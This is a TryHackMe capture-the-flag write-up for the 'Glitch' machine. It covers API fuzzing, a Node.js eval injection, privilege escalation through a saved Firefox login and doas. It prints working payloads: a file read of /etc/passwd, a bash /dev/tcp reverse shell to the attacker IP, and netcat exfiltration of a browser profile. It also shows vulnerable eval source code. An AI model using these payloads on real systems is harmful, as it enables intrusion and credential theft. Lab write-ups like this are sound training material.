---
layout: post
title: "Glitch - TryHackMe"
permalink: "/glitch-tryhackme"
color: rgb(71, 25, 99)
excerpt_separator: <!--more-->
author: ritiksahni
tags: [TryHackMe, Fuzzing, API, NodeJS, RCE, Exfiltration]
---

![Glitch Banner](assets/img/posts/glitch-thm/glitch-banner.png)

Glitch is an easy-rated machine on TryHackMe developed by [infamous55](https://tryhackme.com/p/infamous55). It takes us through enumerating API endpoints and finding an access token and even more endpoints to exploiting NodeJS RCE in one of the query parameters of an API endpoint. We then escalate RCE to get a shell and find stored credentials inside a Firefox profile to escalate to another user and eventually root using misconfigured permissions.

<!--more-->

---

# Contents <a name="top">

* [Port Scanning](#port-scanning)
* [HTTP (Port 80)](#http)
    * [Enumerating API Endpoints](#enumerate-api)
    * [Node.js RCE Exploitation](#nodejs)
* [Privilege Escalation to v0id](#privesc)
* [Privilege Escalation to root](#root)

---

# Port Scanning <a name="port-scanning">

```
Host is up (0.54s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: not allowed
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

There is only 1 port open:
**Port 80** - HTTP (nginx 1.1.14.0)

It also tells that the web server is running on an **Ubuntu** server.

---

# HTTP (Port 80) <a name="http">

Accessing the website in the browser just gives a weird page, there will be a black glitchy image on the entire webpage.

![Web Homepage](assets/img/posts/glitch-thm/http-80.png)

Viewing the page source gives us some interesting javascript code inside `<script>` tag.

Page source:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>not allowed</title>

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        height: 100vh;
        width: 100%;
        background: url('img/glitch.jpg') no-repeat center center / cover;
      }
    </style>
  </head>
  <body>
    <script>
      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    </script>
  </body>
</html>
```


The code inside `<script>` tag is interesting, it runs [fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) to send a request to `/api/access` and extracts the JSON response to log it.

We have discovered this endpoint `/api/access` by viewing the page source, let's access it.

![API Endpoint - /api/access](assets/img/posts/glitch-thm/api-access.png)

There is a JSON parameter "token" with a base64 encoded value. Decoding the value gives us `this_is_not_real`. It is the first flag for this machine.

## Enumerating API Endpoints <a name="enumerate-api">

Now that we know there is an API server that is running, we can try to enumerate more endpoints to see if we can get more information. We can use gobuster to do a regular directory bruteforce. The /api endpoint appears to be the root directory of the API server so now we can bruteforce a directory after /api/.

![Gobuster API Bruteforce](assets/img/posts/glitch-thm/api-bruteforce.png)

There are 2 endpoints with 200 response code. We already know about `/api/access` but `/api/items` is new so let's access it.

![API Endpoint - /api/items](assets/img/posts/glitch-thm/api-items.png)

It just serves some useless JSON data. After trying to enumerate for a while I decided to look for query parameters for this endpoint. However, bruteforcing for query parameters wasn't as straightforward as you'd expect. The hint for user flag indicates to use a different HTTP method and that's how you can fuzz for query parameters, by changing the request method to POST in the fuzzer tool you use.

By changing the request method to POST, all the invalid requests lead to response with 400 status code with JSON body:

![400 Response](assets/img/posts/glitch-thm/post-req.png)

I used ffuf with [big.txt wordlist](https://github.com/xmendez/wfuzz/blob/master/wordlist/general/big.txt) to fuzz parameters. Keep in mind that only POST requests will work if you want to enumerate successfully.

![FFUF data](assets/img/posts/glitch-thm/ffuf-enumerate.png)

Fuff successfully found a query parameter **cmd**. We can send a request with a random value in this parameter using cURL.

**cURL command:**

```bash
curl -D - -XPOST http://10.10.143.224/api/items?cmd=hello --data "cmd=hello"
```

The above cURL command sends a **POST** request to the /api/items endpoint with the query parameter **cmd** and POST data with the same parameter. The `-D -` flag is used to tell cURL to dump the headers to /dev/stdout (standard output)

**HTTP Response after cURL commmand:**

```
deep@myubuntu:~/Documents/platforms/tryhackme/glitch$ curl -D - -XPOST http://10.10.143.224/api/items?cmd=hello --data "cmd=hello"

HTTP/1.1 500 Internal Server Error
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 22 May 2021 01:14:34 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1082
Connection: keep-alive
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>ReferenceError: hello is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), &lt;anonymous&gt;:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/web/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)</pre>
</body>
</html>
```

The response returns a "500 Internal Server Error" status code. The response body is interesting, we can see that it says `hello is not defined <br> &nbsp; &nbsp;at eval`.

This error means that the source code is running **eval** function on our input, and the application is written in **Express JS** - a Node.js web application framework (refer to the file paths in the response body).

> **eval** function evaluates a given expression and if the given input is a statement, eval executes it.<br><br>
> **Syntax**: `eval(String)` where string is an expression, statement, or sequence of statements.

Now that we know the purpose of eval, it is clear that any given statement will be executed server-side. 

We can give in a valid JS statement that will be executed by the eval function.

---

## Node.js RCE Exploitation <a name="nodejs">

We can use different Node.js libraries to perform any task we want. For example - we can use the filesystem library (fs) to read any internal files on the server.

The Node.js one-liner code to read /etc/passwd file would be:

```js
require('fs').readFileSync('/etc/passwd')
```

We can use this code and pass it as a query parameter to the vulnerable endpoint and read the file.

![Reading /etc/passwd](assets/img/posts/glitch-thm/passwd.png)

cURL command - `curl -D - -XPOST "http://10.10.61.92/api/items?cmd=require('fs').readFileSync('/etc/passwd')" --data "cmd=hello"`

**Getting a reverse shell**

We can use a Node.js module "child_process" to execute system commands, the one-liner code for that would be as follows:

```js
require('child_process').execSync("id")
```
We can put in a Bash TCP reverse shell payload to get a stable shell on our machine.

```js
require('child_process').exec('bash -c "/bin/bash -i >& /dev/tcp/10.4.13.51/9000 0>&1"')
```


![Reverse Shell as user](assets/img/posts/glitch-thm/reverse_shell.png)

**How did this work?**

Let's understand the source code of the application to understand how this works. After getting a shell, I read the file /var/web/routes/api.js cause that's the source file of the API endpoint.

```js
// /var/web/routes/api.js

const express = require('express');
const router = express.Router();

const data = {
  sins: ['lust', 'gluttony', 'greed', 'sloth', 'wrath', 'envy', 'pride'],
  errors: [
    'error',
    'error',
    'error',
    'error',
    'error',
    'error',
    'error',
    'error',
    'error',
  ],
  deaths: ['death'],
};

router.get('/items', (req, res) => {
  res.json(data);
});

router.post('/items', (req, res) => {
  if (req.query.cmd) res.send('vulnerability_exploited ' + eval(req.query.cmd));
  else res.status(400).json({ message: 'there_is_a_glitch_in_the_matrix' });
});

router.get('/access', (req, res) => {
  res.json({ token: 'dGhpc19pc19ub3RfcmVhbA==' });
});

module.exports = router
```

We can see an eval function in `router.post('/items')` declaration that says that if "cmd" query parameter exists then respond with "vulnerability_exploited" and the output of the eval function executed on the supplied value on "cmd" query parameter. That is why we saw the output of our command after "vulnerablity_exploited" string in the response.

---

# Privilege Escalation to v0id <a name="privesc">

Running `ls -la` I found a hidden directory `.firefox`. 

![ls -la - user](assets/img/posts/glitch-thm/ls-user.png)

`.firefox` is a directory where Firefox profiles are stored, we can load the profile on our host machine to look for anything interesting saved in the profile.

To analyze the profile, we need to exfiltrate the file to our host machine. I compressed the file using tar and transferred to my machine using netcat.

**Host Machine**
```bash
nc -lvnp 9000 > firefox_data.tar.gz
```

**Glitch Machine**
```bash
tar -czvf firefox_data.tar.gz ./.firefox/
nc 10.4.13.51 9001 < firefox_data.tar.gz
```

To decompress the exfiltrated file on the host machine, run `tar -xvf firefox_data.tar.gz` and use `cd` to go to that directory.

The profile name is `b5w4643p.default-release`. To run firefox with this profile, use the following command:

```bash
firefox --profile .firefox/b5w4643p.default-release
```

Make sure you're in the directory where `.firefox` (exfiltrated and decompressed) directory is present. Firefox should start immediately.

The first thing I checked was for any saved login credentials, v0id's system credentials turned out to be saved in this profile. You can type `about:logins` in the firefox URL bar and get the credentials of v0id.

![Firefox Saved Login Credentials](assets/img/posts/glitch-thm/firefox_saved_creds.png)

---

# Privilege Escalation to root <a name="root">

Now that we have the login credentials of v0id, we can use `su v0id` and use the credentials.

The hint for root in TryHackMe says "My friend says that sudo is bloat". 

![Google Search](assets/img/posts/glitch-thm/doas-google.png)

This hints us towards using "doas" - a sudo alternative for OpenBSD.

Using doas to run /bin/bash with the credentials of v0id works! It's like using `sudo bash` with the current user except using doas instead of sudo.

![doas bash](assets/img/posts/glitch-thm/doas-root.png)

**I hope you enjoyed the write-up and learned new stuff! Feel free to message me on my socials for feedback/suggestions. [Contact Me](/contact)**

Thank you for reading!

If you liked this blog and want to support me, you can do it through my [BuyMeACoffee](https://buymeacoffee.com/ritiksahni) page!

[Back to Top](#top)